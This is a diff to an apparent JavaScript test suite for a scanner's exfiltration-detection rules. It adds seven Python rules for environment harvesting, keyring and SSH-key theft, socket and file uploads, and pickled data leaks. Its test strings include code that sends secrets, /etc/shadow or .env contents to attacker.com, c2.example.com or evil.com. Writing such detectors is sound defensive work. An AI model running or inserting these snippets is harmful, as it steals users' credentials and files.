@@ -23,8 +23,8 @@ describe('Exfiltration Rules', () => {
       `Rule ${ruleId} ${shouldMatch ? 'should' : 'should not'} match: ${content.substring(0, 100)}`);
   }
 
-  test('should have 20 exfiltration rules', () => {
-    assert.strictEqual(rules.length, 20);
+  test('should have 27 exfiltration rules', () => {
+    assert.strictEqual(rules.length, 27);
   });
 
   describe('exfil-base64-in-url', () => {
@@ -444,6 +444,133 @@ describe('Exfiltration Rules', () => {
     test('does not match Telegram API getUpdates', () => {
       testRule('exfil-telegram-bot-send',
         'fetch("https://api.telegram.org/bot123:ABC/getUpdates")',
+        false);
+    });
+  });
+
+  // Python-Native Credential Exfiltration Tests
+  describe('exfil-python-env-harvest', () => {
+    test('detects os.environ with requests.post', () => {
+      testRule('exfil-python-env-harvest',
+        'data = os.environ.copy()\nrequests.post("https://attacker.com", json=data)',
+        true);
+    });
+    test('detects os.environ.items() with httpx.post', () => {
+      testRule('exfil-python-env-harvest',
+        'env = dict(os.environ.items())\nhttpx.post(url, json=env)',
+        true);
+    });
+    test('does not flag os.environ.get without network', () => {
+      testRule('exfil-python-env-harvest',
+        'api_key = os.environ.get("API_KEY")\nprint(api_key)',
+        false);
+    });
+  });
+
+  describe('exfil-python-httpx', () => {
+    test('detects httpx.post with token field', () => {
+      testRule('exfil-python-httpx',
+        'httpx.post(url, json={"token": token, "user": user})',
+        true);
+    });
+    test('detects httpx.post with secret field', () => {
+      testRule('exfil-python-httpx',
+        'httpx.post(endpoint, data={"secret": secret_val})',
+        true);
+    });
+    test('does not flag httpx.post with normal fields', () => {
+      testRule('exfil-python-httpx',
+        'httpx.post(url, json={"name": name, "email": email})',
+        false);
+    });
+  });
+
+  describe('exfil-python-keyring-theft', () => {
+    test('detects keyring.get_password followed by requests', () => {
+      testRule('exfil-python-keyring-theft',
+        'cred = keyring.get_password("service", "user")\nrequests.post("https://c2.example.com", data=cred)',
+        true);
+    });
+    test('detects keyring.get_password followed by socket', () => {
+      testRule('exfil-python-keyring-theft',
+        'pw = keyring.get_password("mail", "alice")\nsocket.connect(("evil.com", 443))',
+        true);
+    });
+    test('does not flag keyring.get_password without network', () => {
+      testRule('exfil-python-keyring-theft',
+        'cred = keyring.get_password("service", "user")\nprint(cred)',
+        false);
+    });
+  });
+
+  describe('exfil-python-ssh-key-theft', () => {
+    test('detects reading id_rsa then requests.post', () => {
+      testRule('exfil-python-ssh-key-theft',
+        'key = open("/root/.ssh/id_rsa").read()\nrequests.post(url, data=key)',
+        true);
+    });
+    test('detects reading .pem file then httpx', () => {
+      testRule('exfil-python-ssh-key-theft',
+        'cert = open("private_key.pem").read()\nhttpx.post(endpoint, content=cert)',
+        true);
+    });
+    test('does not flag reading a regular file', () => {
+      testRule('exfil-python-ssh-key-theft',
+        'data = open("config.txt").read()\nprint(data)',
+        false);
+    });
+  });
+
+  describe('exfil-python-socket-exfil', () => {
+    test('detects socket.sendall with open() content', () => {
+      testRule('exfil-python-socket-exfil',
+        'sock.sendall(open("/etc/passwd").read().encode())',
+        true);
+    });
+    test('detects socket.send with os.environ', () => {
+      testRule('exfil-python-socket-exfil',
+        's.send(str(os.environ).encode())',
+        true);
+    });
+    test('does not flag socket.send with literal data', () => {
+      testRule('exfil-python-socket-exfil',
+        's.send(b"hello world")',
+        false);
+    });
+  });
+
+  describe('exfil-python-requests-files', () => {
+    test('detects requests.post uploading /etc/ file', () => {
+      testRule('exfil-python-requests-files',
+        'requests.post(url, files={"f": open("/etc/shadow")})',
+        true);
+    });
+    test('detects requests.post uploading .env file', () => {
+      testRule('exfil-python-requests-files',
+        'requests.post(url, files={"env": open(".env")})',
+        true);
+    });
+    test('does not flag requests.post with normal file', () => {
+      testRule('exfil-python-requests-files',
+        'requests.post(url, files={"report": open("report.pdf")})',
+        false);
+    });
+  });
+
+  describe('exfil-python-pickle-exfil', () => {
+    test('detects pickle.dumps of os.environ with requests', () => {
+      testRule('exfil-python-pickle-exfil',
+        'data = pickle.dumps(os.environ)\nrequests.post(url, data=data)',
+        true);
+    });
+    test('detects pickle.dumps of subprocess output with socket', () => {
+      testRule('exfil-python-pickle-exfil',
+        'out = pickle.dumps(subprocess.check_output(["env"]))\nsocket.sendall(out)',
+        true);
+    });
+    test('does not flag pickle.dumps of normal objects', () => {
+      testRule('exfil-python-pickle-exfil',
+        'data = pickle.dumps({"result": "ok"})\nprint(data)',
         false);
     });
   });
